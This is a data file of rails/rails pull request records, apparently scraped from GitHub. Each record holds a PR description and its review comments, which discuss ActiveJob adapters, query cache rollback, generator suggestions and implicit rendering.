518,rails/rails,16485.0,WIP.,"['I might have missed it, but does this set the queueing backend to `:inline` by default in the test environment? Have we considered what testing will look like for apps that use `enqueue_at`?', ""Where does the test harness set up redis queues and pg tables for testing the different queues?  I can't seem to find it."", ""@tenderlove  We have integration tests https://github.com/rails/activejob/pull/102 but:\r\nI wanted to drop them https://github.com/seuros/actionmailer-deliver_later/issues/6#issuecomment-51931510\r\n@ddh said no  :) https://github.com/seuros/actionmailer-deliver_later/issues/6#issuecomment-51931510\r\n@rafaelfranca said to make separate PR with them https://github.com/seuros/rails/issues/1#issuecomment-51945362\r\nSo I'll make the PR once we get this PR merged"", 'Not related to the PR itself, but I was wondering: what makes some part of Rails ""active*"" or ""action*""? ""Active record"" was an existing term of course, but what makes ActionMailer and ActiveJob, action and active, relatively?', 'I\'ve used Action for anything that is frontend aimed (controller/views), Active for backend (models etc). \r\n\r\n> On Aug 16, 2014, at 12:20, Douwe Maan <notifications@github.com> wrote:\r\n> \r\n> Not related to the PR itself, but I was wondering: what makes some part of Rails ""active*"" or ""action*""? ""Active record"" was an existing term of course, but what makes ActionMailer and ActiveJob, action and active, relatively?\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.', 'All right, curiosity satisfied :)', ':metal:', ""@tenderlove here are the integration tests\r\nhttps://github.com/rails/rails/pull/16541\r\n\r\n-- \r\nCristian Bica\r\n\r\n\r\nOn Fri, Aug 15, 2014 at 5:07 AM, Aaron Patterson <notifications@github.com>\r\nwrote:\r\n\r\n> Where does the test harness set up redis queues and pg tables for testing\r\n> the different queues? I can't seem to find it.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/rails/rails/pull/16485#issuecomment-52267497>.\r\n>"", ':+1:', ""@mperham I am looking at the pull request here rails/activejob#35\r\nI still don't see any rationale behind removing the later method in the sucker_punch_adapter unless you have any reason as to why it was removed, could it be added back?"", '@jGRUBBS it was proposed again in rails/rails #16643 but because Sucker Punch does not have a persistent store we decided not to accept it.', '@cristianbica thanks for the explanation, now I see.']"
519,rails/rails,17305.0,"This fixes a regression introduced by 6cc0367.

ActiveRecord, if used without Rails, always checks the ""default_env"" environment. This would be OK, except that Sinatra also supports environments, and it runs with {RACK|RAILS}_ENV=production. This patch adds a fallback to RAILS_ENV and RACK_ENV (and ultimately default_env) if Rails.env doesn't exist.

Feedback requested on the tests, because I feel like there may need to be some more work there.

Also, this can probably cleanly apply against 4.1's stable branch.

Output of `rake test:sqlite3`:

```
Finished in 31.919725s, 132.6766 runs/s, 365.8866 assertions/s.

4235 runs, 11679 assertions, 0 failures, 0 errors, 2 skips

You have skipped tests. Run with --verbose for details.
```","[""Updated the tests... they still pass for me, but let's see if it makes Travis happy :)"", 'Looks good to me. Could you rebase your commits?\r\n\r\n@schneems WDYT?', 'Squashed and made changes suggested by @rebyn.', 'Check out the discussion under https://github.com/rails/rails/pull/17305#discussion_r19166506', 'OK - commit squashed AND now using The One True Hash Format.', ' :heart: :green_heart: :blue_heart: :yellow_heart: :purple_heart:']"
520,rails/rails,17820.0,"Fixes https://github.com/rails/rails/issues/17449

Make sure the query cache is flushed after transaction rollback (for both real and savepoint transactions).

The changes here feel a little bit hacky, I'm looking for some suggestions how to do this cleaner and without too much monkey patching. I had a few other ideas, but @arthurnn suggested that the approach in this PR is better (more consistent with exec_insert etc.).

### Alternative 1: Just do it in Transaction and assume QueryCache is already loaded

```diff
 diff --git a/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb b/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 index 4a4506c..d20c02e 100644
 --- a/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 +++ b/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 @@ -18,7 +18,8 @@ module ActiveRecord
          end
        end
 
 -      attr_reader :query_cache, :query_cache_enabled
 +      attr_reader :query_cache_enabled
 +      attr_accessor :query_cache
 
        def initialize(*)
          super
 diff --git a/activerecord/lib/active_record/connection_adapters/abstract/transaction.rb b/activerecord/lib/active_record/connection_adapters/abstract/transaction.rb
 index fd666c8..f247bb8 100644
 --- a/activerecord/lib/active_record/connection_adapters/abstract/transaction.rb
 +++ b/activerecord/lib/active_record/connection_adapters/abstract/transaction.rb
 @@ -184,10 +184,12 @@ module ActiveRecord
        end
 
        def within_new_transaction(options = {})
 +        old_query_cache = @connection.query_cache.dup
          transaction = begin_transaction options
          yield
        rescue Exception => error
          rollback_transaction if transaction
 +        @connection.query_cache = old_query_cache
          raise
        ensure
          unless error
```

### Alternative 2: Monkey-patch the transaction manager

```diff
 diff --git a/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb b/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 index 4a4506c..353ba4c 100644
 --- a/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 +++ b/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 @@ -1,9 +1,17 @@
  module ActiveRecord
    module ConnectionAdapters # :nodoc:
 +    module TransactionManagerDirtiesQueryCache
 +      def rollback_transaction(*)
 +        @connection.clear_query_cache if @connection.query_cache_enabled
 +        super
 +      end
 +    end
 +
      module QueryCache
        class << self
          def included(base) #:nodoc:
            dirties_query_cache base, :insert, :update, :delete
 +          base.new.transaction_manager.class.prepend(TransactionManagerDirtiesQueryCache)
          end
 ```

### Alternative 3: Add a new Connection#rollback method that always gets called
```diff
diff --git a/activerecord/lib/active_record/connection_adapters/abstract/database_statements.rb b/activerecord/lib/active_record/connection_adapters/abstract/database_statements.rb
 index 12b16b2..55f3e54 100644
 --- a/activerecord/lib/active_record/connection_adapters/abstract/database_statements.rb
 +++ b/activerecord/lib/active_record/connection_adapters/abstract/database_statements.rb
 @@ -235,7 +235,7 @@ module ActiveRecord
        # Rolls back the transaction (and turns on auto-committing). Must be
        # done if the transaction block raises an exception or returns false.
        def rollback_db_transaction() end
 
 +      # Rolls back non-db state of the connection, like query caches. Gets
 +      # called on transaction rollback.
 +      def rollback() end
 +
        def default_sequence_name(table, column)
          nil
        end
 diff --git a/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb b/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 index 4a4506c..b056104 100644
 --- a/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 +++ b/activerecord/lib/active_record/connection_adapters/abstract/query_cache.rb
 @@ -3,7 +3,7 @@ module ActiveRecord
      module QueryCache
        class << self
          def included(base) #:nodoc:
 -          dirties_query_cache base, :insert, :update, :delete
 +          dirties_query_cache base, :insert, :update, :delete, :rollback
          end
 
          def dirties_query_cache(base, *method_names)
 diff --git a/activerecord/lib/active_record/connection_adapters/abstract/transaction.rb b/activerecord/lib/active_record/connection_adapters/abstract/transaction.rb
 index fd666c8..d3a3ea8 100644
 --- a/activerecord/lib/active_record/connection_adapters/abstract/transaction.rb
 +++ b/activerecord/lib/active_record/connection_adapters/abstract/transaction.rb
 @@ -63,6 +63,7 @@ module ActiveRecord
        end
 
        def rollback
 +        connection.rollback
          @state.set_state(:rolledback)
        end
```

Thoughts? @arthurnn @dylanahsmith @sirupsen","['I suggested this, because the way I see it is, `rollback_db_transaction` and `rollback_to_savepoint` as public APIs as they are defined on `database_statements`, the the `exec_*` methods, internal adapter calls. In that way we can wrap the public methods on the query_cache module to add some functionality to  them.\r\n\r\n@chancancode @rafaelfranca thoughts?', 'updated', ""The only concern I can think about this approach is if other adapter overrides `rollback_to_savepoint`/`rollback_db_transaction` (as we used to before this PR) , they wont have the query_cache clear working, till they override the new `exec_*` method.. I guess thats not a big deal, as this doesn't work ATM, for any adapter.\r\n\r\n@rafaelfranca @matthewd would be able to tell better if the API change in here is OK or not."", 'No opinions?', '@senny @sgrif can you also take a look? thanks', 'Backported as a953f7f674997517c5b9580335dda3338840aa84 and 5dc0bb9203175f4777b1b4c923f2f96450b77d89', 'Thanks @rafaelfranca ', '> This broke the build. Reverting until future investigation\r\n\r\n@rafaelfranca Did you have a chance to investigate it further?', 'seems like it was only reverted on 4.1.']"
521,rails/rails,18439.0,"While pairing on a project this morning we were confused as to why this code kept failing:

```ruby
# user.rb
class User < ActiveRecord::Base
  attr_accessor :terms_and_conditions
  validates_acceptance_of :terms_and_conditions
end
```

```ruby
describe User do
  it ""is valid"" do
    user = User.new(terms_and_conditions: true)
    expect(user).to be_valid
  end
end
```

After looking through the source we found that the default value is: ""1"". This seems nonintuitive. To make this test pass we had to change our code to this:

```ruby
# user.rb
class User
  attr_accessor :terms_and_conditions
  validates_acceptance_of :terms_and_conditions, accept: true
end
```

This Pull Request changes the default accept from ""1"" to [""1"", true]. Allowing you to specify an array of options. It supports single values as well for backwards compatibility.

/cc @speasley","[""This needs a changelog entry. I have no opinions on the feature itself, I'll let someone else decide whether or not to merge."", 'Thank you @sgrif. ']"
522,rails/rails,18551.0,Fixes #18550 ,"['@aditya-kapoor sorry, can you also add a CHANGELOG entry as well - thanks!\r\n', '@pixeltrix I have added the entry in Changelog, Please have a look.', '@pixeltrix I have made the changes suggested by you. :smile: ', '@aditya-kapoor thanks for your patience :green_heart:', 'Is this fix going to be released in a 4.2.x?']"
523,rails/rails,18526.0,"- Extracted silence_stream method to new module in activesupport/testing
- Added include for the same in ActiveSupport::Test.
- Removed occurrences of silence_stream being used elsewhere.
- Reordered activesupport testcase requires alphabetically.

cc @senny ","['I agree with @carlosantoniodasilva . My https://github.com/rails/rails/pull/18381#issuecomment-69457173 was probably not descriptive enough. I think we need to find a new place to share code for our test suites without exposing them through `ActiveSupport::TestCase`.', 'I removed the inclusion in `ActiveSupport::TestCase` and made it available as needed in the tests.', ""Done. Can't  move in `capture(stream)` as it is getting mixed in `ActiveSupport::TestCase` which defeats our purpose again.\r\nOn a side note, I see that these methods that were deprecated from Kernel, are still in guides. Will update guides after this."", ""Is it being mixed from as/test_case or in some other abstract unit? I don't think it should be in our test case which would make it available for everyone."", 'Actually its spread even more- railties abstract unit, railties test isolation, deprecation test, `ActiveRecord::TestCase`, `Rails::Generators::Testing::Behaviour`.  \r\n`Rails::Generators::Testing::Behaviour` gets mixed in `Rails::Generators::TestCase`', 'I see.. it was probably mixed in those base classes to make it easier to share, but I think they should never be publicly available (this was the original intent, right?).\r\n\r\nLets move them out as well, people know these are deprecated and being removed anyway.', ""Generators tests doesn't work without these methods. They are internal of these test cases, are not public available, just private methods of a public interface."", 'Right, so we are good keeping them there. But they should be moved from elsewhere in our suite.', ""Ok, extracted `capture` to `Stream`. Also this shouldn't affect wherever it was getting getting mixed in."", 'It would be also good to focus on those PRs in the recent past where the warnings have been ignored to due non existence of certain instance variables and like. Using this module, we can reduce the unnecessary checks for those variables.\r\nAny thoughts on this?', ""Can you show some examples @aditya-kapoor ? In any case I think it's an unrelated discussion."", '@carlosantoniodasilva updated.']"
524,rails/rails,19021.0,,[]
525,rails/rails,18395.0,"92cf133788b2bef729ffeda5ca4c87d3a011e7ba brought this feature, which was great, yet also sometimes frustrating because it always returned three suggestions at once, and some of them are indeed a bit too far off. Examples are:

<kbd>rails g foo</kbd>

```
Could not find generator 'foo'. Maybe you meant 'job' or 'css:assets' or 'generator'
```
Do we really need the last two? (I even doubt the first one). For that matter, as we have [a big shortcut (max value)](https://github.com/rails/rails/blob/79728982aa757b19cfd37b748335671660f33524/railties/lib/rails/generators.rb#L267) to calculate the distance (which I think is okay for the perf sake), the distance to longer words are computed rather incorrectly, but they can be included in the suggestions after sorted. I guess thats why `model` or `task` (4 char distant), `assets` (6) are behind `css:assets` (10) in the above example.

I don't think it was supposed to be an impeccable suggestion feature (given the introduction of https://github.com/rails/rails/pull/15497#issue-34915375), but sometimes less is more. Me thinks that likes of suggestions are appreciated typically when we can infer a solid amount of what users meant to run, and otherwise it would just end up as haphazard items. 

If users try to run something like <kbd>rails g xyzzy</kbd>, pretty much every command available is off so it's safe to say he/she has no idea on what generator commands are. In such a case, I'd just list up generator commands, as [it used to be](https://github.com/rails/rails/blob/4ae90a7dd8f9857f5d8c90c0135dd873f90e6957/railties/lib/rails/generators.rb#L159-L160) (or <kbd>run -h</kbd>), instead of serving the least 'off' names.

After trying dozens of real-world typos, I think the threshold of the distance should be just `1`. If the input contains more than 2 typos, users can immediately notice it themselves, or they dont know what to type. It can be raised depending on the length of the word, but the longest is `active_record:migration` and even that is now split as `[""active"", ""record"", ""migration""]`, each of them is individually tested to match. 

Test cases also should be updated, but I'd like to wait until #17050 is merged.","['I can add a missing test and add some more improvements here and there if it ever interests anyone, but this PR gets stale, so I wonder I would just reduce it all down to just use `to_sentence(last_word_connector: "" or "")` instead of `.join("" or "")`.\r\n\r\nCurrent\r\n```\r\nMaybe you meant \'job\' or \'coffee:assets\' or \'generator\'\r\n```\r\nMy Suggestion\r\n```\r\nMaybe you meant \'job\', \'coffee:assets\' or \'generator\'\r\n```', '@schneems thoughts?', ""I commented on some code. We're making a ton of assumptions here on how we want it to work and how the user will expect it to work. I think we can make some improvements but i'm not sold on this change wholesale. \r\n\r\nWhat was your original use case for this change? You weren't typing `rails g foo` and getting upset at the results. What were you actually trying to accomplish? \r\n\r\nFor the line you referenced, it was purely copy/pasta. I think we should remove it, as it does produce an incorrect result. https://github.com/rails/rails/blob/79728982aa757b19cfd37b748335671660f33524/railties/lib/rails/generators.rb#L267 we might also consider blaming the original code in rubygems to see when/why it was introduced and fixing there. That's a really good catch, thanks for reporting."", '@schneems Thanks for reviewing. I really appreciate your extra effort.\r\n\r\nYou\'re entirely correct that I wasn\'t motivated to make this PR by the real typo. Rather, was just investigating the generators, and happened to feel that the suggestions might not always include good ones. While still believing in what I want to bring, not sure this PR is so convincing considering how little feedback it has gathered. And I\'m totally fine to listen to what the original contributor thinks of. \r\n\r\nSo I think I will withdraw a big change, but reduce this PR to remove only [the line you agreed](https://github.com/rails/rails/blob/79728982aa757b19cfd37b748335671660f33524/railties/lib/rails/generators.rb#L267) as well as using `to_sentence(last_word_connector: "" or "")`.', ""I'm :+1: on removing that line (and also https://github.com/rails/rails/blob/79728982aa757b19cfd37b748335671660f33524/railties/lib/rails/generators.rb#L263 as it's the only place that references `max`) \r\n\r\nI'm :+1: on the `to_sentence` change.\r\n\r\nWhy don't you rebase this commit and make those two changes, and I'm good merging this in. In a separate PR I would be willing to consider some kind of a max bounds but i'm thinking higher, like 3 or 4, though honestly i'm just pulling magic numbers from the air. I can see the benefit of saying that edit distance is so far off that we can't guess, but since we're so uncertain list out all the options. For the sake of getting things in, in a timely fashion it would be best to split that out into a separate PR (if you're still interested), you can @ mention me and i'll be a bit quicker on that review. \r\n\r\n@samphippen do you have any thoughts on the value of a max edit distance? "", ""@schneems before I issue an opinion can you make sure I've understood the context:\r\n\r\n* suggestions are currently sorted by edit distance\r\n* the top n results are taken\r\n* some things that make no sense sometimes show up, even though the edit distance is large, because they're still the closest things\r\n* you want to eliminate them by thresholding the edit distance\r\n\r\nIs that correct?"", '@samphippen you got it. The idea is to be a bit more helpful if you run\r\n\r\n```\r\nrails g i hate javascript\r\n```\r\n\r\nIt doesn\'t make sense to say ""did you mean \'migrations\'"" and in that case we should just print all the results. However if we\'re pretty comfortable saying, the edit distance is low enough, then we\'ll give you some suggestions. The question is, what do you think ""low enough"" would be? ', ""Most commonly, I swap the order of a single character because I type quickly but accurately. The edit distance for that error would be two. I'd suggest 4 (allowing for two characters to have swapped positions, or some more macro typo) and see how it feels. Test intentionally fat fingering some commands and see what happens?"", ""@schneems one time, when it was acceptable to write a really bad search implementation, we used edit distance 3 on people's names and nobody seemed to complain (here, have a totally artificial data point, along with my more formal reckons)."", ""@schneems it's also probably out of scope for this PR, but I'd be tempted to implement jaro-winkler, sort and select top n and see if it performs any better."", ""@schneems jaro winkler (for example) prefers prefix matches over non-prefix matches, which levenshtein doesn't."", ""@schneems maybe we can pair on rolling a jaro-winkler branch at railsconf and see if it's any good?"", ""@samphippen sounds good.\r\n\r\n@shunsukeaida let's shoot for an edit distance max of 3 on the separate PR. Let me know when you removed those bad lines from the existing edit distance calculation, and used the better `to_sentence`."", ""@schneems from my experience I can say fixed magic numbers don't always work. did_you_mean gem [used to use a fixed number](https://github.com/yuki24/did_you_mean/blob/97787be2fdcfa766c48e59b72b01b616e8cc8df1/lib/did_you_mean/method_finder.rb#L12) and I found it unhelpful specially when the misspelled word is long. So I changed it to [calculate a threshold based on the length of the misspelled word](https://github.com/yuki24/did_you_mean/blob/3623ae8d8a25af0a6b5b72a04f6bb91a8f7499d9/lib/did_you_mean/word_collection.rb#L19). This strategy works at least better than fixed numbers. We still have to come up with [a nice magic number](https://github.com/yuki24/did_you_mean/blob/3623ae8d8a25af0a6b5b72a04f6bb91a8f7499d9/lib/did_you_mean/word_collection.rb#L27) to calculate the threshold, though. "", '@schneems I finally squashed my commits. Could you take a look at it? Also, would you still want me to submit a PR to set the max distance to <code>3</code>? I think what @yuki24 says is worth considering, in that it\'s hard to make something satisfying everybody anyway.\r\n\r\nI actually think we can make an isolated module for a full-fledged suggestion feature, since it can be used in more part of Rails. The first thing coming to my mind is  ""template is missing"" messages with suggestions, but perhaps it\'s a long way (Rails 5.1 or later). ', 'I merged your fixes in. Thanks for your help here :heart: \r\n\r\n> Also, would you still want me to submit a PR to set the max distance\r\n\r\nI would actually defer to sam and yuki on this one. I like the idea of basing the magic number partially on input values. But again it\'s hard to test this without a large set of data of commonly misspelled generator names. I\'m open to a PR like this provided it doesn\'t add too much complexity.\r\n\r\n> ""template is missing"" messages with suggestions, but perhaps it\'s a long way (Rails 5.1 or later)\r\n\r\nThat sounds pretty cool. I\'m a fan of small progressive enhancements. However I don\'t want to go overboard. If we stick to real world pains that we\'ve seen and fix work on them, we should be fine. New feature pull requests don\'t need to wait for a specific version. If you\'ve run into the template problem before I think this could be a good enhancement. We want to be careful that we don\'t cause any performance bottlenecks in production, limiting the check to development should be good enough. ']"
526,rails/rails,16992.0,@cristianbica this is https://github.com/rails/rails/pull/16968,"['The test adapter was made like this so we can run tests in parallel. @seuros you worked on this\r\nAnyway if you are going to do this make a separate PR', ""Here's the PR when we switch the test adapter to instance methods https://github.com/rails/rails/pull/16724#discussion-diff-16919033"", 'Ok. So ... as discussed the ability to pass a proc to queue_adapter is still under discussion so I suggest to leave this PR with the initial scope of being able to override sub-jobs adapters and start a new PR with the proc thing.\r\nOn the other hand we need to document the current change so we need to add documentation to `queue_adapter=` and `queue_adapter`. What would be nicer is if you have some time to update the AJ guide :)', ""Also you need to rebase before we're ready to merge"", 'I meant to rebase so you can squash your commits', ""Then you should split them into multiple PRs.\r\n I don't like the singleton conversion. we had it like that and changed it to instance . cc @jeremy "", 'No need to squash or split it into multiple PRs.\r\n\r\nLooks good to me :+1: ', ""I'd keep `TestAdapter` as a class with a single instance rather than switching to using a class object as the adapter. Nice cleanup of the adapter internals in either case."", '@tamir this is the same as #16977 so we can close #16977, right? ', 'I was erroneously ccd. the mail should have gone to @tamird i think.\r\n\r\nOn 08 Oct 2014, at 09:02, Cristian Bica <notifications@github.com> wrote:\r\n\r\n> @tamir this is the same as #16977 so we can close #16977, right?\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> ', ""So:\r\n1. Having different queue_adapter per job class: I'm ok with it but I remember talking something about `Module#prepend` to make the code cleaner but we couldn't as Rails 4.2 supports ruby 1.9.3. Now we support ruby 2.2+ so we could use `Module#prepend`. Do you remember?\r\n2. Queue adapter as a callable. I still have my doubts on this as the usage of this feature will be pretty low and there is an alternative: you could temporary define a `queue_adapter` class method on your job and remove it after you're done with the migration\r\n3. I don't remember the reasoning for the TestAdapter thing but as @jeremy said to keep it this way let's not touch it for now.\r\n\r\nSo IMO you should create a new PR with the first commit (and it would be nice to have a cleaner implementation with `Module#prepend`) and for the last 2 let's wait for some more feedback."", ""could you please take me off the cc!\nIm not interested and the person this is intended for does not get the message!\nplease cc tamird\n\nOn 23 Feb 2015, at 21:48, Cristian Bica <notifications@github.com> wrote:\n\n> So:\n> 1. Having different queue_adapter per job class: I'm ok with it but I remember talking something about Module#prepend to make the code cleaner but we couldn't as Rails 4.2 supports ruby 1.9.3. Now we support ruby 2.2+ so we could use Module#prepend. Do you remember?\n> 2. Queue adapter as a callable. I still have my doubts on this as the usage of this feature will be pretty low and there is an alternative: you could temporary define a queue_adapter class method on your job and remove it after you're done with the migration\n> 3. I don't remember the reasoning for the TestAdapter thing but as @jeremy said to keep it this way let's not touch it for now.\n> \n> So IMO you should create a new PR with the first commit (and it would be nice to have a cleaner implementation with Module#prepend) and for the last 2 let's wait for some more feedback.\n> \n> \xef\xbf\xbd\n> Reply to this email directly or view it on GitHub.\n> \n\n"", ""@tamir github added you as a follower when I cc'ed you by mistake last year (sorry for that). You need to click on the unsubscribe button on the right sidebar to stop getting notifications about this."", '@tamird https://github.com/rails/rails/pull/16968/files#r18053261', ""@tamird I know :) but it's a similar implementation and you participated in the talk and I was asking you if you remember what were the implications of `Module#prepend`."", 'I think the idea was not to have the auxiliary _queue_adapter. Would something like this gist work: https://gist.github.com/cristianbica/0e14926fb730e8cf2c59?', ':heart: took a few months to get this merged :)', ':+1: ', ""I'm not seeing this feature being mentioned in the [Basics guide](http://edgeguides.rubyonrails.org/active_job_basics.html). Or we have an Advanced guide somewhere that I don't know :)?\r\n\r\nI think this is cool and deserves a mention. Should I submit a PR or has anyone worked on this already?"", ':+1: \r\nReally cool, thanks!  Would be great to add it in the basic guide, it took some time to know it was possible.']"
527,rails/rails,19311.0,@rafaelfranca @jeremy ,"[""Correct me, if I am mistaken: isn't `QueueAdapter.interpret_adapter` not a hot path? Why are we rolling out a custom caching mechanism, why not simply use a plain mutex around the whole `#interpret_adapter` method?\r\n\r\nAlso, does setting `QueueAdapterClass.queue_adapter=` need to be thread-safe? The general rule of thumb in Rails is that class-level configuration assignments are on only to done during a single-threaded boot sequence?\r\n\r\nIs there a reason you're not using `ThreadSafe::Cache` (ie: `cache = ThreadSafe::Cache.new; cache.compute_if_absent(some_key) {lookup(name).new(*adapter_args, &block)}`)?\r\n\r\n"", ""> Correct me, if I am mistaken: isn't QueueAdapter.interpret_adapter not a hot path? Why are we rolling out a custom caching mechanism, why not simply use a plain mutex around the whole #interpret_adapter method?\r\n\r\nProbably true - just erring on the side of caution.\r\n\r\n> Also, does setting QueueAdapterClass.queue_adapter= need to be thread-safe? The general rule of thumb in Rails is that class-level configuration assignments are on only to done during a single-threaded boot sequence?\r\n\r\nAgain, probably true - just erring on the side of caution.\r\n\r\n> Is there a reason you're not using ThreadSafe::Cache (ie: cache = ThreadSafe::Cache.new; cache.compute_if_absent(some_key) {lookup(name).new(*adapter_args, &block)})?\r\n\r\nJust plain ignorance. I'll switch to that."", ""Removed the caching - I'll save it for a future PR.""]"
528,rails/rails,19377.0,"Fixes #19036

https://github.com/rails/rails/issues/19036#issuecomment-82362962

I want to do a comparison like:

```ruby
    def default_render(*args)
      if template_exists?(action, _prefixes)
        render(*args)
      else
        head :no_content
      end
    end
```

However, there is no way (that I know of) to access the action at this point, it is simply the method. I opted for rescuing `MissingTemplate` as an iteration 1 that I will look into refactoring. Ideally, the logic for rendering `default_render` vs `head :no_content` will happen in `ImplicitRender#send_action` and not in default_render.","[""> Ideally, the logic for rendering default_render vs head :no_content will happen in ImplicitRender#send_action and not in default_render.\r\n\r\nYes, this is the best solution here. Lets split `default_render` in two methods, one that calls `render` if the template exists and other that call `head :no_content` if it doesn't.\r\n\r\nAlso it is missing a test for implicit render with non-defined actions."", '@rafaelfranca in send_action, how do you get access to the action_name from the method? I need this to do template_exists as the method/action_name may differ.', ""It will hardly differ. `method_name` is `action_name`, unless you don't have an action with that name and your controller responds to `action_missing`. If that is the case the `performed?` will return true since `action_missing` will set the response body and we will not call `default_render` anyway."", '@rafaelfranca I think that variants through off the `method_name` vs `action_name`. For example, this spec fails because it thinks a template does not exist and renders a `head :no_content` instead of the mobile variant.\r\n\r\n```ruby\r\n  def test_variant_with_implicit_rendering\r\n    @request.variant = :mobile\r\n    get :variant_with_implicit_rendering\r\n    assert_equal ""text/html"", @response.content_type\r\n    assert_equal ""mobile"", @response.body\r\n  end\r\n```', 'Looking into variant implicit rendering more. It looks like the default behavior is to render the variant name. I can not find where in actionpack or actionview this behavior is defined at.\r\n\r\nShould the default for variants be to render the variant name, or head :no_content?', '@rafaelfranca do you have any feedback on how to approach the implicit variant rendering?', '@sb8244 what does render the variant name mean? Can you show a code example?', 'Sure @kaspth \r\n\r\n```ruby\r\n  def test_variant_with_implicit_rendering\r\n    @request.variant = :mobile\r\n    get :variant_with_implicit_rendering\r\n    assert_equal ""text/html"", @response.content_type\r\n    assert_equal ""mobile"", @response.body\r\n  end\r\n```\r\n\r\nThis test is expecting that the behavior of an implicit rendering of a variant is the variant name. However, it seems like this behavior is going to change based on this PR, so that the default behavior is a `HEAD no-content`.\r\n\r\n', 'Ah, I see where I went astray. The default render for variants just renders the correct template, say `show.html+mobile.erb`.\r\n\r\nThat\'s why you can\'t find any rendering of the variant name defined in Action Pack or Action View. The reason you\'re seeing `assert_equal ""mobile"", @response.body` in the test, is that the template rendered by the test only contains the word ""mobile"". You can see it here: https://github.com/sb8244/rails/blob/issue-19036/actionpack/test/fixtures/respond_to/variant_with_implicit_rendering.html%2Bmobile.erb\r\n\r\nTo answer your question `head :no_content` is what we want.', ""@sb8244 Left a few notes. We also need an entry at the top of Action Pack's CHANGELOG.md file. Finally squash all your commits into one.\r\n\r\nOnce those things have been addressed, we should be good to go, :+1:."", '@rafaelfranca do we need a deprecation warning for this too or an upgrade flag (raise instead of no content)?\r\n\r\nWe might even be able to remove the missing template error completely.', ""@kaspth in the case of mobile template being rendered, wouldn't we want that in this specific test? There is a template that exists, so `head :no_content` would be unexpected behavior. If the variant doesn't have a template, then it should be a head no_content."", ""@sb8244 sorry, for not being clearer. What you're saying is what we want: render the variant template if it's there or `head :no_content`."", ""Awesome, I'm digging through template_exists? now to figure out how to properly pass the variant. It's not getting used currently so `template_exists?(method, _prefixes)` is returning false."", ""I've determined these will work:\r\n\r\n```\r\ntemplate_exists?(method, _prefixes, false, {}, { variants: request.variant })\r\n```\r\n\r\nor set .variants\r\n\r\n```\r\nlookup_context.variants = request.variant\r\n```\r\n\r\nAny preference?"", '@sb8244 do we need either of those? The way I see it variants are already handled.\r\n\r\nFor instance the original tests would render the correct template if the correct variant was set and otherwise raise `MissingTemplate`.\r\nIt seems the variant is extracted in the resolver too: https://github.com/rails/rails/blob/24637e577c0c8139434bada14911f376ec2634e9/actionview/lib/action_view/template/resolver.rb#L188.', ""The variants are not handled in the case of implicit rendering in the proposed change. It worked previously because the following code snippet always `default_renders` unless `performed?`. Because it doesn't check for a template, it will either render correctly (letting the resolver do its thing) or raise the MissingTemplate error.\r\n\r\n```ruby\r\nret = super\r\ndefault_render unless performed?\r\nret\r\n```\r\n\r\nIn the proposed change, it only default_renders if the template exists, so the implicit rendering of variant doesn't get handled."", ""Ah, I see. Well, I don't like mutating the `@_lookup_context`, so let's go with the first option.\r\n\r\nCan we change `template_exists?` to use `**options` instead of `options = {}`: https://github.com/rails/rails/blob/ecb1981bfd3ffaca3a3efd110fc85380ece8191d/actionview/lib/action_view/lookup_context.rb#L129.\r\n\r\nThis way we should be able to call it like:\r\n\r\n```ruby\r\ntemplate_exists?(method, _prefixes, variants: @_request.variant)\r\n```"", '@kaspth I finalized the changes based on your feedback (changing `exists?`), test suite is passing. The commits are squashed and should be ready to go.', ""@sb8244 we also need a changelog entry at the top of the file here: https://github.com/rails/rails/blob/master/actionpack/CHANGELOG.md\r\n\r\nIf you're unsure what to write just rewrite @dhh's impetus from the original issue :wink:"", 'Got it @kaspth ', 'The changes so far look good, :+1:. Still want to hear if we need an upgrade flag.', '@matthewd those changes you suggested are in place. Less methods affected = win', 'Awesome! Great work @sb8244!', 'Woot first Rails commit! See yall at Rails conf.\n\nOn Monday, April 6, 2015, David Heinemeier Hansson <notifications@github.com>\nwrote:\n\n> Merged #19377 <https://github.com/rails/rails/pull/19377>.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/rails/rails/pull/19377#event-274030567>.\n>\n\n\n-- \n\n\n  Steve Bussey \xe2\x80\xa2SalesLoft\n\n\xe2\x80\xa2Software Engineer\n\ne steve.bussey@salesloft.com w salesloft.com\n<http://salesloft.com/?v=1&utm_expid=76406993-1.E5ncJhwyTAW9uGaR1WdBTA.1?utm_source=Email-Signature-Rescue&utm_medium=Email-Signature&utm_campaign=Email-Signature-Rescue>\n\na 3423 Piedmont Rd NE, Atlanta, GA 30305\n\n[image: Facebook] <https://www.facebook.com/SalesLoft> [image: Twitter]\n<https://twitter.com/SalesLoft> [image: Linkedin]\n<https://www.linkedin.com/company/salesloft> [image: wordpress]\n<http://blog.salesloft.com/blog/> [image:\nhttp://salesloft.com/prospector/#video]\n<http://salesloft.com/prospector/#video>  [image: Software Engineer Logo]\n<http://salesloft.com/?v=1&utm_expid=76406993-1.E5ncJhwyTAW9uGaR1WdBTA.1?utm_source=Email-Signature-Rescue&utm_medium=Email-Signature&utm_campaign=Email-Signature-Rescue>\n', ""Congrats on your first merged Rails commit @sb8244! :smile:\r\n\r\nThis caused a minor bug in ActionPack (don't feel bad we've all caused bugs :bug:). actionpack/test/controller/mime/respond_to_test.rb tests only run after merge so CI didn't catch it earlier. Fixed in 188934c."", 'I\'d love to find a way to bring back the ""Missing template"" exception for a regular browser request to fix #23077. As a start, I spent some time looking through this merge and how it compares to the behavior in Rails 4. The primary difference is that `default_render` now checks `template_exists?`. This short-circuits the template existence checks that are already part of the `render` method in `ActionView::TemplateRenderer`, including raising `ActionView::MissingTemplate` if the template isn\'t found.\r\n\r\nFor browser requests, it would be ideal to just call `render` straight away and let 